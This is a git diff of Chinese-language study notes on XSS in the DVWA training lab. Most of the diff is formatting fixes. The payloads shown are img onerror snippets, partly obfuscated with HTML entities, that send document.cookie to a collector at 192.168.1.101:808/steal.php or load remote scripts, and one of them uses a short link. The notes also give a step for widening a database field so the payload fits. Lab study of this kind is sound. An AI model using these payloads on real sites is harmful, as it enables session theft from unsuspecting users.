@@ -1,4 +1,4 @@
-##dvwa学习xss
+## dvwa学习xss
 
 ### 测试环境
 
@@ -126,12 +126,14 @@ XSSER,XSSF等
 
 js操作ajax(注入字符过多，不推荐)
 
-```<img src=# onerror='var url="http://192.168.1.101:808/steal.php";var postStr="data="+document.cook&#x69;e;var ajax=null;&#x69;f(w&#x69;ndow.XMLHttpRequest){ajax=new XMLHttpRequest();}else &#x69;f(w&#x69;ndow.Act&#x69;veXObject){ajax=new Act&#x69;veXObject("M&#x69;crosoft.XMLHTTP");}else{ajax=null;}ajax.open("POST",url,true);ajax.setRequestHeader("Content-Type", "appl&#x69;cat&#x69;on/x-www-form-urlencoded");ajax.send(postStr);'>```
+```<img src=# onerror='var url="http://192.168.1.101:808/steal.php";var postStr="data="+document.cook&#x69;e;var ajax=null;&#x69;f(w&#x69;ndow.XMLHttpRequest){ajax=new XMLHttpRequest();}else &#x69;f(w&#x69;ndow.Act&#x69;veXObject){ajax=new Act&#x69;veXObject("M&#x69;crosoft.XMLHTTP");}else{ajax=null;}ajax.open("POST",url,true);ajax.setRequestHeader("Content-Type", "appl&#x69;cat&#x69;on/x-www-form-urlencoded");ajax.send(postStr);'>
+```
 
 jq操作ajax(注入字符过多，不推荐)(这里使用短链接会异常，应该是浏览器解析dom的问题)
 
 ```
-<img src=# onerror="var a=document.createElement('scr&#x69;pt');a.setAttr&#x69;bute('src', 'https://dwz.cn/tA0Ob030');document.getElementsByTagName('head')[0].appendCh&#x69;ld(a);var b= document.createElement('scr&#x69;pt'); b.setAttr&#x69;bute('src','http://192.168.1.101:808/c.js');document.getElementsByTagName('head')[0].appendChild(b);">```
+<img src=# onerror="var a=document.createElement('scr&#x69;pt');a.setAttr&#x69;bute('src', 'https://dwz.cn/tA0Ob030');document.getElementsByTagName('head')[0].appendCh&#x69;ld(a);var b= document.createElement('scr&#x69;pt'); b.setAttr&#x69;bute('src','http://192.168.1.101:808/c.js');document.getElementsByTagName('head')[0].appendChild(b);">
+```
 
 ```ALTER TABLE guestbook MODIFY name VARCHAR(180);```
 
@@ -149,7 +151,8 @@ firefox:F12 ，inspector/查看器，编辑html， 修改 maxlength
 
 7.记录cookie
 
-```<img src=# onerror=(location.href="http://192.168.1.101:808/steal.php?data="+document.cookie)>```
+```<img src=# onerror=(location.href="http://192.168.1.101:808/steal.php?data="+document.cookie)>
+```
 
 这种方式有个缺点就是将cookie发送到steal.php后他会刷新页面跳转到steal.php，所以要用ajax优化
 
